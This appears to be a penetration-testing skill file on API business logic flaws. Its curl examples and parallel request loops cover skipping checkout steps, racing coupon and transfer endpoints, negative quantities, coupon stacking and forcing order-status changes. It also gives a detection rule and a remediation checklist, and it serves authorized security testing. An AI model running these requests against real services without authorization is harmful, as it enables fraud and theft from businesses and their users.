<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: testing-api-business-logic-flaws
description: >-
  Test APIs for business logic vulnerabilities including workflow bypass,
  race conditions, price manipulation, and state machine violations that
  circumvent intended application behavior.
domain: cybersecurity
subdomain: api-security
tags:
  - business-logic
  - api-security
  - owasp-api6
  - race-conditions
  - workflow-bypass
version: "1.0"
author: defconxt
license: AGPL-3.0
metadata:
  mitre-attack: ["T1190", "T1499"]
  owasp-api: ["API6"]
  tools: ["curl", "burp-suite", "turbo-intruder", "nuclei"]
---

# Testing API Business Logic Flaws

## Overview

Business logic flaws exist when API workflows can be abused in ways
developers did not anticipate. These include skipping payment steps,
exploiting race conditions for duplicate rewards, manipulating state
transitions, and abusing referral/coupon systems. Unlike technical
vulnerabilities, these require understanding the business domain.

## Prerequisites

- Tools: ["curl", "burp-suite", "turbo-intruder", "nuclei"]
- Understanding of application business flows
- Multiple test accounts for multi-party testing
- Authorized testing engagement with written scope

## Key Concepts

- **Workflow bypass**: Skipping required steps in a multi-step process
- **Race conditions**: Concurrent requests exploiting non-atomic operations
- **State machine abuse**: Forcing invalid state transitions
- **Quantity/price manipulation**: Negative quantities, zero-cost items

## Workflow

### Step 1: Map Business Workflows

```bash
# Identify multi-step processes
# Example: checkout flow
# Step 1: Add to cart → Step 2: Apply coupon → Step 3: Payment → Step 4: Confirm

# Test skipping directly to confirmation
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"ORDER123"}' \
  https://target.com/api/orders/confirm

# Test accessing step 3 without step 2
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"orderId":"ORDER123","paymentMethod":"card"}' \
  https://target.com/api/orders/pay
```

### Step 2: Test Race Conditions

```bash
# Race condition on coupon/reward redemption
# Send concurrent requests using GNU parallel
seq 1 20 | parallel -j 20 \
  'curl -s -o /dev/null -w "%{http_code}" \
    -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"coupon\":\"DISCOUNT50\"}" \
    https://target.com/api/coupons/redeem'

# Race condition on balance transfer
seq 1 10 | parallel -j 10 \
  'curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"amount\":100,\"to\":\"user_b\"}" \
    https://target.com/api/transfer'

# Using Burp Turbo Intruder for precise timing
# Python script for Turbo Intruder:
# def queueRequests(target, wordlists):
#     engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=20)
#     for i in range(20):
#         engine.queue(target.req, gate='race')
#     engine.openGate('race')
```

### Step 3: Test Quantity and Price Manipulation

```bash
# Negative quantity
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId":"123","quantity":-1}' \
  https://target.com/api/cart/add

# Zero-cost via quantity manipulation
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId":"123","quantity":0}' \
  https://target.com/api/cart/add

# Float precision abuse
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount":0.001,"currency":"USD"}' \
  https://target.com/api/transfer

# Coupon stacking
for CODE in "SAVE10" "SAVE20" "WELCOME" "VIP50"; do
  curl -s -X POST -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"coupon\":\"$CODE\"}" \
    "https://target.com/api/cart/coupon"
done
curl -s -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/cart | jq '.total, .discounts'
```

### Step 4: Test State Machine Violations

```bash
# Force invalid state transitions
# Normal: pending → processing → shipped → delivered
# Test: pending → delivered (skip processing and shipped)
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"delivered"}' \
  https://target.com/api/orders/ORDER123/status

# Reverse state transition
curl -s -X PUT -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"status":"pending"}' \
  https://target.com/api/orders/DELIVERED_ORDER/status

# Cancel after fulfillment
curl -s -X POST -H "Authorization: Bearer $TOKEN" \
  https://target.com/api/orders/DELIVERED_ORDER/cancel
```

## Detection Opportunities

| Signal | Source | Description |
|--------|--------|-------------|
| Concurrent identical requests | API gateway | Multiple same requests within milliseconds |
| Workflow step skipping | Application logs | Steps accessed out of order |
| Negative values | Input validation | Negative quantities or amounts |
| Invalid state transitions | State machine logs | Unauthorized status changes |

```yaml
title: Race Condition — Concurrent Duplicate Requests
id: b8c9d0e1-f2a3-4567-bcde-678901234567
status: experimental
description: Detects concurrent identical requests indicating race condition exploitation
logsource:
  category: webserver
detection:
  selection:
    cs-method: POST
    cs-uri-stem|contains:
      - '/redeem'
      - '/transfer'
      - '/coupon'
  timeframe: 1s
  condition: selection | count() by c-ip, cs-uri-stem > 5
falsepositives:
  - Client retry logic with aggressive timeout
level: high
tags:
  - attack.t1499
  - attack.impact
```

## Verification

- [ ] Multi-step workflows enforce step ordering
- [ ] Race conditions mitigated with locking/idempotency
- [ ] Negative and zero quantities rejected
- [ ] State machine transitions validated server-side
- [ ] Coupon/discount stacking prevented
- [ ] Financial calculations use server-side values only

## References

- [OWASP API6:2023 — Unrestricted Access to Sensitive Business Flows](https://owasp.org/API-Security/editions/2023/en/0xa6-unrestricted-access-to-sensitive-business-flows/)
- [CWE-362 — Concurrent Execution Using Shared Resource](https://cwe.mitre.org/data/definitions/362.html)
- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
